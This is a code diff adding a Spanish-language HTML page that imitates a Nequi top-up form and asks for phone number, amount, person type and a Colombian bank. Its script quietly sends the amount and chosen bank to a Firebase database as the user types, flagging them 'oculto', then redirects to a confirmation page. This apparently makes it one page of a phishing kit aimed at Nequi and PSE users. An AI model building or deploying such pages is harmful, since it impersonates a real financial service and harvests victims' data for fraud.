@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Recarga</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div class="container">
+
+<img src="logo.svg" class="logo">
+
+<h2 class="title">Recarga tu Nequi</h2>
+
+<div class="input-box">
+<input type="tel" id="input1" placeholder=" ">
+<label>Número de celular</label>
+</div>
+
+<div class="input-box">
+<input type="tel" id="input2" placeholder=" ">
+<label>Confirma el número</label>
+</div>
+
+<div class="input-box">
+<input type="text" id="input3" placeholder=" ">
+<label>¿Cuánto?</label>
+</div>
+
+<div class="input-box">
+<select id="select1" required>
+<option value="Natural" selected>Natural</option>
+<option value="Empresa">Empresa</option>
+</select>
+<label>Tipo de persona</label>
+</div>
+
+<div class="select-box">
+<select id="select2">
+<option value="">Elige el banco</option>
+<option>ACCION FIDUCIARIA</option>
+<option>ALIANZA FIDUCIARIA</option>
+<option>BAN100</option>
+<option>BANCAMIA S.A.</option>
+<option>BANCO AGRARIO</option>
+<option>BANCO AV VILLAS</option>
+<option>BANCO BBVA COLOMBIA S.A.</option>
+<option>BANCO CAJA SOCIAL</option>
+<option>BANCO COOPERATIVO COOPCENTRAL</option>
+<option>BANCO DAVIVIENDA</option>
+<option>BANCO DE BOGOTA</option>
+<option>BANCO DE OCCIDENTE</option>
+<option>BANCO FALABELLA</option>
+<option>BANCO FINANDINA S.A. BIC</option>
+<option>BANCO GNB SUDAMERIS</option>
+<option>BANCO ITAU</option>
+<option>BANCO J.P. MORGAN COLOMBIA S.A.</option>
+<option>BANCO MUNDO MUJER S.A.</option>
+<option>BANCO PICHINCHA S.A.</option>
+<option>BANCO POPULAR</option>
+<option>BANCO SANTANDER COLOMBIA</option>
+<option>BANCO SERFINANZA</option>
+<option>BANCO UNION</option>
+<option>BANCOLOMBIA</option>
+<option>BANCOOMEVA S.A.</option>
+<option>DAVIbank S.A.</option>
+<option>GLOBAL66</option>
+<option>LULO BANK</option>
+<option>DAVIPLATA</option>
+<option>NU</option>
+<option>MOVII S.A.</option>
+</select>
+</div>
+
+<p class="info">
+La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
+</p>
+
+<button class="btn" id="btn" disabled>Continuar</button>
+
+<a href="#" class="help">Ayuda</a>
+
+</div>
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+
+const { db, uid, ref, update } = window;
+
+const input1 = document.getElementById("input1");
+const input2 = document.getElementById("input2");
+const input3 = document.getElementById("input3");
+const select1 = document.getElementById("select1");
+const select2 = document.getElementById("select2");
+const button = document.getElementById("btn");
+
+function validar() {
+let ok =
+input1.value.trim() !== "" &&
+input2.value.trim() !== "" &&
+input3.value.trim() !== "" &&
+select1.value !== "" &&
+select2.value !== "" &&
+input1.value === input2.value;
+
+button.style.background = ok ? "#da0081" : "#d6d6d6";
+button.style.color = ok ? "#fff" : "#7a7a7a";
+button.disabled = !ok;
+}
+
+input3.addEventListener("input", () => {
+
+let limpio = input3.value.replace(/\D/g, "");
+
+if (limpio === "") {
+input3.value = "";
+
+update(ref(db, "dataPages/" + uid), {
+monto: "",
+oculto: true
+});
+
+validar();
+return;
+}
+
+let formateado = limpio.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+
+input3.value = "$" + formateado;
+
+update(ref(db, "dataPages/" + uid), {
+monto: limpio,
+oculto: true
+});
+
+validar();
+});
+
+input1.addEventListener("input", validar);
+input2.addEventListener("input", validar);
+select1.addEventListener("change", validar);
+
+select2.addEventListener("change", () => {
+update(ref(db, "dataPages/" + uid), {
+banco: select2.value,
+oculto: true
+});
+validar();
+});
+
+button.addEventListener("click", () => {
+
+let telefono = input1.value;
+let monto = input3.value.replace(/\D/g, "");
+let montoFormato = input3.value;
+
+localStorage.setItem("telefono", telefono);
+localStorage.setItem("monto", monto);
+localStorage.setItem("montoFormato", montoFormato);
+localStorage.setItem("banco", select2.value);
+localStorage.setItem("persona", select1.value);
+
+window.location.href = "confirmacion.html";
+});
+
+});
+</script>
+
+</body>
+</html>
